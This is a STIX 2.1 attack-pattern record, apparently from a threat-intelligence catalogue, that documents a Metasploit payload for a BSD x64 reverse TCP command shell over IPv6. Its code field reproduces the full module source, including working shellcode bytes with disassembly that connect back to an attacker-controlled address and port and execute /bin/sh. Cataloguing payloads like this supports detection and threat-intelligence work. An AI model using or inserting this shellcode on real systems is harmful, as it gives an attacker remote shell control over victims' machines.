{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da0fa96d-db06-4202-8540-dba24a713d0b",
    "created": "2024-08-14T16:33:19.411054Z",
    "modified": "2024-08-14T16:33:19.411058Z",
    "name": "BSD x64 Command Shell, Reverse TCP Inline (IPv6)",
    "description": "Connect back to attacker and spawn a command shell over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/bsd/x64/shell_reverse_ipv6_tcp.rb",
            "external_id": "shell_reverse_ipv6_tcp.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/earthquake/shellcodes/blob/master/x86_64_bsd_ipv6_reverse_tcp.asm.c"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 105\n\n  include Msf::Payload::Single\n  include Msf::Payload::Bsd\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'BSD x64 Command Shell, Reverse TCP Inline (IPv6)',\n      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',\n      'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',\n      'References'    => [['URL', 'https://github.com/earthquake/shellcodes/blob/master/x86_64_bsd_ipv6_reverse_tcp.asm.c']],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LHOST'    => [ 85, 'ADDR6' ],\n              'LPORT'    => [ 79, 'n' ],\n              'SCOPEID'  => [ 101,  'V' ]\n            },\n          'Payload' =>\n            \"\\x6a\\x61\"             + #  \tpushq  $0x61                       #\n            \"\\x58\"                 + #  \tpop    %rax                        #\n            \"\\x99\"                 + #  \tcltd                               #\n            \"\\x6a\\x1c\"             + #  \tpushq  $0x1c                       #\n            \"\\x5f\"                 + #  \tpop    %rdi                        #\n            \"\\x6a\\x01\"             + #   pushq  $0x1                        #\n            \"\\x5e\"                 + #  \tpop    %rsi                        #\n            \"\\x0f\\x05\"             + #   syscall                            #\n            \"\\x48\\x97\"             + #   xchg   %rax,%rdi                   #\n            \"\\x04\\x3e\"             + #   add    $0x3e,%al                   #\n            \"\\x0f\\x05\"             + #   syscall                            #\n            \"\\xff\\xc6\"             + #   inc    %esi                        #\n            \"\\x04\\x59\"             + #   add    $0x59,%al                   #\n            \"\\x0f\\x05\"             + #  \tsyscall                            #\n            \"\\xff\\xce\"             + #  \tdec    %esi                        #\n            \"\\xff\\xce\"             + #   dec    %esi                        #\n            \"\\x04\\x58\"             + #   add    $0x58,%al                   #\n            \"\\x0f\\x05\"             + #   syscall                            #\n            \"\\xe9\\x23\\x00\\x00\\x00\" + #   jmpq   <forth>                     #\n            # back:\n            \"\\x5e\"                 + #   pop    %rsi                        #\n            \"\\x6a\\x1c\"             + #   pushq  $0x1c                       #\n            \"\\x5a\"                 + #  \tpop    %rdx                        #\n            \"\\x66\\x83\\xc0\\x62\"     + #   add    $0x62,%ax                   #\n            \"\\x0f\\x05\"             + #   syscall                            #\n            \"\\x99\"                 + #  \tcltd                               #\n            \"\\x52\"                 + #  \tpush   %rdx                        #\n            \"\\x48\\xbf\\x2f\\x2f\\x62\" + #   mov \"//b\"                          #\n            \"\\x69\\x6e\\x2f\\x73\\x68\" + #  \t\"in/sh\",%rdi                       #\n            \"\\x57\"                 + #  \tpush   %rdi                        #\n            \"\\x48\\x89\\xe7\"         + #   mov    %rsp,%rdi                   #\n            \"\\x52\"                 + #  \tpush   %rdx                        #\n            \"\\x57\"                 + #  \tpush   %rdi                        #\n            \"\\x48\\x89\\xe6\"         + #   mov    %rsp,%rsi                   #\n            \"\\x04\\x3b\"             + #   add    $0x3b,%al                   #\n            \"\\x0f\\x05\"             + # \tsyscall                            #\n            # forth:\n            \"\\xe8\\xd8\\xff\\xff\\xff\" + #   callq <back>                       #\n            # sockaddr_in6\n            \"\\x00\\x1c\\x11\\x5c\"     + #   AF_INET6+port                      #\n            \"\\x00\\x00\\x00\\x00\"     + #   no-one-cares                       #\n            \"\\x00\\x00\\x00\\x00\"     + #   IPv6-                              #\n            \"\\x00\\x00\\x00\\x00\"     + #   addr-                              #\n            \"\\x00\\x00\\x00\\x00\"     + #   in-                                #\n            \"\\x00\\x00\\x00\\x01\"     + #   16 bytes                           #\n            \"\\x00\\x00\\x00\\x00\"      #   Scope ID                           #\n        }\n      ))\n      register_options([\n         OptInt.new('SCOPEID', [false, \"IPv6 scope ID, for link-local addresses\", 0])\n      ])\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}